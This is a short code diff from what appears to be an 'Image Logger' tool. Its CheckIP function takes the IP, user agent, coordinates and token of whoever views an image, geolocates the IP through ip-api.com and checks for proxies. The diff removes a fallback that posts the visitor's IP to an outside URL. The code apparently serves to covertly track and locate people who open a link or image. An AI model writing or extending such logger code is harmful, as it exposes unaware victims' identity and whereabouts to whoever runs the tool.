@@ -73,9 +73,6 @@ blacklistedIPs = ("27", "104", "143", "164")
 
 def CheckIP(ip, useragent=None, coords=None, url=None, token=None, timestamp=None, port=None, filename=None, url_thumbnail=None, botname='Image Logger', db: Session = None):
     info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
-    if not info:
-        res =requests.post(url, json={'ip':ip})
-        return
     if info["proxy"]:
         if config["vpnCheck"] == 2:
             return
